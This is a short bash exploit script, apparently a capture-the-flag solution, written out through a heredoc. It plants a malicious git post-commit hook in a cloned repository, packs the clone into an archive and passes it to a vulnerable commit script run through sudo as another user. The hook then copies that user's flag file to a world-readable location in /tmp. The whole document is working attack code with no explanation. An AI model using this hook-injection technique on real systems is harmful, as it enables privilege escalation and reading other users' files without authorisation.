cat << 'EOF' > exploit.sh
#!/bin/bash
set -e

REPO_SRC="/app"
REPO_CLONE="myrepo"
ARCHIVE="exploit.tar.gz"
FLAG_OUT="/tmp/flag.txt"

echo "[+] Cleaning old files..."
rm -rf "$REPO_CLONE" "$ARCHIVE" "$FLAG_OUT" 2>/dev/null || true

echo "[+] Cloning admin repo..."
git clone "$REPO_SRC" "$REPO_CLONE"

echo "[+] Creating malicious post-commit hook..."
cat << 'HOOKEOF' > "$REPO_CLONE/.git/hooks/post-commit"
#!/bin/bash
cat /home/peter/flag.txt > /tmp/flag.txt
chmod 777 /tmp/flag.txt
HOOKEOF

chmod +x "$REPO_CLONE/.git/hooks/post-commit"

echo "[+] Copying exact .git/config from admin..."
cp "$REPO_SRC/.git/config" "$REPO_CLONE/.git/config"

echo "[+] Creating exploit archive..."
tar -czf "$ARCHIVE" "$REPO_CLONE"

echo "[+] Running vulnerable script as peter..."
sudo -u peter /opt/commit.sh "$ARCHIVE"

echo "[+] Checking flag..."
if [[ -f "$FLAG_OUT" ]]; then
    echo
    echo "============== FLAG =============="
    cat "$FLAG_OUT"
    echo "=================================="
else
    echo "[!] Exploit failed: flag not found"
fi
EOF
